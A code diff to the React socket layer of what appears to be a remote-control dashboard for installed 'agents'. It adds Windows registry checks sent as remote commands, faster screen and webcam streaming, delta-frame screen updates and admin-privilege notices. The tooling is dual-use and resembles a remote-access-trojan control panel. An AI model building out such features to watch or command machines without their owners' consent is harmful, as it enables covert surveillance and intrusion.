@@ -78,6 +78,8 @@ interface SocketContextType {
     };
     updatedAt?: Date;
   }>;
+  registryPresence: Record<string, Record<string, { id: string; hive: string; path: string; key: string; present: boolean; exists_path: boolean; exists_value: boolean; value?: any }>>;
+  checkRegistryPresence: (agentId: string, items: Array<{ id: string; hive: string; path: string; key: string }>) => void;
   requestSystemInfo: (detailLevel?: 'basic' | 'standard' | 'full') => void;
   requestNetworkInfo: () => void;
   requestInstalledSoftware: () => void;
@@ -232,6 +234,7 @@ export function SocketProvider({ children }: { children: React.ReactNode }) {
   const [installedSoftware, setInstalledSoftware] = useState<any[]>();
   const [lastProcessOperation, setLastProcessOperation] = useState<any>();
   const [lastProcessDetails, setLastProcessDetails] = useState<any>();
+  const [registryPresence, setRegistryPresence] = useState<Record<string, Record<string, { id: string; hive: string; path: string; key: string; present: boolean; exists_path: boolean; exists_value: boolean; value?: any }>>>({});
 
   const addCommandOutput = useCallback((output: string) => {
     console.log('🔍 SocketProvider: addCommandOutput called with:', output);
@@ -495,12 +498,12 @@ export function SocketProvider({ children }: { children: React.ReactNode }) {
                   const raw = localStorage.getItem(`stream:last:${sel}`);
                   const saved = raw ? JSON.parse(raw) : {};
                   if (socket && saved?.screen) {
-                    socket.emit('set_stream_mode', { agent_id: sel, type: 'screen', mode: 'buffered', fps: 10, buffer_frames: 30 });
-                    socket.emit('start_stream', { type: 'screen', quality: 'medium' });
+                    socket.emit('set_stream_mode', { agent_id: sel, type: 'screen', mode: 'buffered', fps: 20, buffer_frames: 40 });
+                    apiClient.startStream(sel, 'screen', 'medium', 'buffered', 20, 40);
                   }
                   if (socket && saved?.camera) {
-                    socket.emit('set_stream_mode', { agent_id: sel, type: 'camera', mode: 'buffered', fps: 10, buffer_frames: 30 });
-                    socket.emit('start_stream', { type: 'camera', quality: 'medium' });
+                    socket.emit('set_stream_mode', { agent_id: sel, type: 'camera', mode: 'buffered', fps: 20, buffer_frames: 40 });
+                    apiClient.startStream(sel, 'camera', 'medium', 'buffered', 20, 40);
                   }
                 } catch {}
               } else {
@@ -528,12 +531,13 @@ export function SocketProvider({ children }: { children: React.ReactNode }) {
           )
         );
         
-        // Show notification about privilege change
         const privilegeText = is_admin ? 'Administrator' : 'Standard user';
-        toast.info(`Agent privilege updated: ${agent_id} is now ${privilegeText}`);
-        
-        // Add to activity log
-        addCommandOutput(`Privilege update: Agent ${agent_id} changed to ${privilegeText}`);
+        const rawAgentId = typeof agent_id === 'string' ? agent_id : String(agent_id ?? '');
+        const displayAgentId = rawAgentId.length > 32
+          ? `${rawAgentId.slice(0, 8)}…${rawAgentId.slice(-4)}`
+          : (rawAgentId || 'Unknown');
+        toast.info(`Agent privilege updated: ${displayAgentId} is now ${privilegeText}`);
+        addCommandOutput(`Privilege update: Agent ${displayAgentId} changed to ${privilegeText}`);
         
       } catch (error) {
         console.error('Error processing agent privilege update:', error);
@@ -554,6 +558,32 @@ export function SocketProvider({ children }: { children: React.ReactNode }) {
     });
     socketInstance.on('installed_software_response', (data: any) => {
       setInstalledSoftware(data?.software || []);
+    });
+    socketInstance.on('registry_presence', (data: any) => {
+      try {
+        const agent_id = String(data?.agent_id || '');
+        const items = Array.isArray(data?.items) ? data.items : [];
+        if (!agent_id || !items.length) return;
+        setRegistryPresence(prev => {
+          const current = prev[agent_id] || {};
+          const updated = { ...current };
+          for (const it of items) {
+            const id = String(it?.id || '');
+            if (!id) continue;
+            updated[id] = {
+              id,
+              hive: String(it?.hive || ''),
+              path: String(it?.path || ''),
+              key: String(it?.key || ''),
+              present: Boolean(it?.present),
+              exists_path: Boolean(it?.exists_path),
+              exists_value: Boolean(it?.exists_value),
+              value: it?.value
+            };
+          }
+          return { ...prev, [agent_id]: updated };
+        });
+      } catch (e) {}
     });
 
     // Room joining confirmation
@@ -618,6 +648,44 @@ export function SocketProvider({ children }: { children: React.ReactNode }) {
       } catch {}
       const event = new CustomEvent('screen_frame', { detail: data });
       window.dispatchEvent(event);
+    });
+    // Delta streaming: keyframe baseline
+    socketInstance.on('screen_keyframe', (data: { agent_id: string; frame_id?: number; width?: number; height?: number; frame: any }) => {
+      console.log('🧩 SocketProvider: Received screen_keyframe from agent:', data.agent_id);
+      try { markStreamActive(String(data.agent_id || '')); } catch {}
+      try {
+        const f = data?.frame as any;
+        if (typeof f !== 'string' && f) {
+          const bytes = f instanceof Uint8Array ? f : new Uint8Array(f);
+          data.frame = bytesToBase64(bytes);
+        } else if (typeof f === 'string' && f.startsWith('data:')) {
+          data.frame = extractBase64Payload(f) || f;
+        }
+      } catch {}
+      const event = new CustomEvent('screen_keyframe', { detail: data });
+      window.dispatchEvent(event);
+    });
+    // Delta streaming: tile updates
+    socketInstance.on('screen_tile', (data: { agent_id: string; frame_id?: number; x: number; y: number; w: number; h: number; frame: any }) => {
+      try { markStreamActive(String(data.agent_id || '')); } catch {}
+      try {
+        const f = data?.frame as any;
+        if (typeof f !== 'string' && f) {
+          const bytes = f instanceof Uint8Array ? f : new Uint8Array(f);
+          data.frame = bytesToBase64(bytes);
+        } else if (typeof f === 'string' && f.startsWith('data:')) {
+          data.frame = extractBase64Payload(f) || f;
+        }
+      } catch {}
+      const event = new CustomEvent('screen_tile', { detail: data });
+      window.dispatchEvent(event);
+    });
+    socketInstance.on('cursor_update', (data: any) => {
+      try { markStreamActive(String(data.agent_id || '')); } catch {}
+      try {
+        const event = new CustomEvent('cursor_update', { detail: data });
+        window.dispatchEvent(event);
+      } catch {}
     });
     // Fallback single-frame response handler (used by request_video_frame)
     socketInstance.on('video_frame', (data: { agent_id?: string; frame: any }) => {
@@ -1197,6 +1265,20 @@ export function SocketProvider({ children }: { children: React.ReactNode }) {
     }
   }, [socket, connected, addCommandOutput, setLastActivity, markStreamActive]);
 
+  const checkRegistryPresence = useCallback((agentId: string, items: Array<{ id: string; hive: string; path: string; key: string }>) => {
+    try {
+      if (!socket || !connected || !agentId) return;
+      const payload = JSON.stringify(items || []);
+      const k = `${agentId}:registry:check`;
+      const now = Date.now();
+      const last = lastEmitRef.current[k] || 0;
+      if (now - last < 1000) return;
+      lastEmitRef.current[k] = now;
+      socket.emit('execute_command', { agent_id: agentId, command: `check-registry:${payload}` });
+      addCommandOutput(`Requested registry presence check for ${agentId}`);
+    } catch (e) {}
+  }, [socket, connected, addCommandOutput]);
+
   const startStream = useCallback((agentId: string, type: 'screen' | 'camera' | 'audio') => {
     if (socket && connected) {
       let command = '';
@@ -1448,6 +1530,8 @@ export function SocketProvider({ children }: { children: React.ReactNode }) {
     commandsExecutedCount,
     agentConfig,
     notifications,
+    registryPresence,
+    checkRegistryPresence,
     requestSystemInfo,
     requestNetworkInfo,
     requestInstalledSoftware,
